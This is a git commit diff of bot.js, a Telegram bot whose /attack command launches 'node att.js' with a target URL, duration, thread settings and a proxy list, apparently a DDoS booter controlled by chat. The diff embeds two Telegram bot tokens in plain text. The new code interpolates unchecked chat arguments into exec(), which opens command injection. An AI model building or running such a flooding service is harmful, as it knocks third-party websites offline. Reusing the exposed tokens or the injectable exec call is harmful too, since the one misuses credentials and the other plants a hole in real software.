80d9e94804b4b87c2d3b8aa4e10f80e2a023e02a
Omorfaruk0099 <119661669+Omorfaruk0099@users.noreply.github.com>
2024-02-08 21:44:19 +0600

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,12 +1,11 @@
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
-const { URL } = require('url'); // Import URL module for URL validation
 
-// Telegram bot token
-const token = '6303718232:AAG_dk50RAgZ2_DueqEqx2g3b-EWCuZbErg';
+
+const token = '6303718232:AAF5ntXYNpz2i3HrGYwLar9xNeghMHv5kHU';
 const bot = new TelegramBot(token, { polling: true });
 
-// Function to check if a string is a valid URL
+
 function isValidURL(url) {
     try {
         new URL(url);
@@ -16,59 +15,38 @@ function isValidURL(url) {
     }
 }
 
-// Countdown timer for 30 seconds
-function countdownTimer(chatId) {
-    bot.sendMessage(chatId, 'Countdown: 30 seconds');
-
-    setTimeout(() => {
-        bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
-    }, 30000);
-}
-
 bot.onText(/\/attack (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const args = match[1].split(' ');
+    const target = args[0];
+    const time = parseInt(args[1]);
+    const numWords = args[2] || 64;
+    const numChars = args[3] || 10;
+    const proxyFile = args[4] || 'proxy.txt';
 
-    if (args.length === 1) {
-        const command = 'node att.js';
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                bot.sendMessage(chatId, `Error occurred: ${error.message}`);
-            } else {
-                bot.sendMessage(chatId, '😈 ATTACK START 😈');
-                countdownTimer(chatId);
-            }
-        });
-    } else if (args.length === 2) {
-        const target = args[0];
-        const time = parseInt(args[1]);
 
-        if (target === 'none') {
-            bot.sendMessage(chatId, 'Please provide a valid URL');
-            return;
-        }
-
-        if (!isValidURL(target)) {
-            bot.sendMessage(chatId, 'Please provide a valid URL');
-            return;
-        }
-
-        if (time < 10 || time > 60) {
-            bot.sendMessage(chatId, 'Time must be between 10 and 60');
-            return;
-        }
-
-        const command = `node att.js ${target} ${time} 64 10 proxy.txt`;
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                bot.sendMessage(chatId, `Error occurred: ${error.message}`);
-            } else {
-                bot.sendMessage(chatId, '😈 ATTACK START 😈');
-                countdownTimer(chatId);
-            }
-        });
-    } else {
-        bot.sendMessage(chatId, 'Invalid command format');
+    if (!isValidURL(target)) {
+        bot.sendMessage(chatId, 'Please provide a valid URL.Also Read Usage: /attack www.example.com 100');
+        return;
     }
+    if (isNaN(time) || time < 60 || time > 240) {
+        bot.sendMessage(chatId, 'Time must be between 60 and 240');
+                return;
+    }
+
+
+    const command = `node att.js ${target} ${time} ${numWords} ${numChars} ${proxyFile}`;
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            bot.sendMessage(chatId, `ATTACK SUCCESSFULLY END`);
+        } else {
+            bot.sendMessage(chatId, '😈 ATTACK START 😈');
+        }
+    });
+
+
+    bot.sendMessage(chatId, 'Countdown: 30 seconds');
+    setTimeout(() => {
+        bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
+    }, 30000);
 });
-            
